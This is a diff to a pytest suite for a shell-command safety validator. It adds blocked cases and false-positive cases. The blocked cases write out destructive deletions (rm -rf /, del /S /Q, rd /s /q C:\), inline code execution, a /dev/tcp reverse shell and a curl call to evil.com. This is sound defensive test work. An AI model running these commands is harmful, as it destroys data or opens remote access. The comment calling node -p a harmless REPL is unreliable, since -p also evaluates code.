@@ -146,12 +146,24 @@ class TestBlockedPatterns:
             "rm -rf ..",
             "rm -rf C:\\",
             "rm -f -r /",
+            # rm with -- separator (attempt to bypass)
+            "rm -rf -- /",
+            "rm -fr -- /",
+            # Windows del variants
+            "del /S /Q C:\\Windows",
+            "del /F /S /Q important.txt",
+            # Windows rmdir variants
+            "rmdir /S /Q C:\\Program Files",
+            # Windows rd alias (shorthand for rmdir)
+            "rd /s /q C:\\",
+            "rd /s C:\\temp",
             # sudo
             "sudo apt install something",
             "sudo rm -rf /var/log",
             # Inline code execution
             "python -c 'import os; os.system(\"rm -rf /\")'",
             'python3 -c \'__import__("os").system("id")\'',
+            "node -e 'require(\"fs\").rmSync(\"/\")'",
             # Reverse shell indicators
             "bash -i >& /dev/tcp/10.0.0.1/4444",
             # Credential theft
@@ -251,3 +263,69 @@ class TestEdgeCases:
         """Blocked commands should include a useful error message."""
         with pytest.raises(CommandBlockedError, match="blocked for safety"):
             validate_command("curl http://evil.com")
+
+
+class TestFalsePositives:
+    """Benign text that should NOT trigger false positives."""
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # Comments or documentation mentioning dangerous commands
+            "# curl is used for fetching files",
+            "# TODO: use bash to script this",
+            "echo 'Reading curl documentation'",
+            'echo "The rm -rf command is dangerous"',
+            # Benign uses in string context
+            "grep -r 'rm -rf' docs/",
+            "grep 'del /S' README.md",
+            # Node.js scripts without -e flag
+            "node server.js",
+            "node --version",
+            "node dist/app.js --port 3000",
+            # Python without -c flag
+            "python script.py",
+            "python -m pytest tests/",
+            "python3 setup.py build",
+            # Ruby, Perl without -e flag
+            "ruby script.rb",
+            "perl script.pl",
+            # Paths / files containing keywords
+            "cat bash_config.sh",
+            "cat /usr/local/bin/node",
+            "ls -la .bashrc",
+            # Windows safe commands
+            "dir /S Documents",
+            "copy file1.txt file2.txt",
+            "move old.txt new.txt",
+        ],
+    )
+    def test_benign_text_does_not_block(self, cmd):
+        """Benign uses of keywords in comments/text should not be blocked."""
+        validate_command(cmd)  # should not raise
+
+    def test_node_without_e_flag_is_safe(self):
+        """node script.js is safe; only node -e is blocked."""
+        validate_command("node app.js")
+        validate_command("node --version")
+        validate_command("node -p 'process.version'")  # -p is a REPL, not -e
+
+    def test_rd_executable_is_blocked(self):
+        """Windows rd (alias for rmdir) should be blocked."""
+        with pytest.raises(CommandBlockedError):
+            validate_command("rd /s /q C:\\")
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # del with various flag combinations
+            "del /S /Q C:\\temp\\*.*",
+            "del /F /S /Q important.txt",
+            # rmdir with /S (recurse)
+            "rmdir /S C:\\empty",
+        ],
+    )
+    def test_windows_delete_variants_blocked(self, cmd):
+        """Windows delete variants with recursive flags should be blocked."""
+        with pytest.raises(CommandBlockedError):
+            validate_command(cmd)
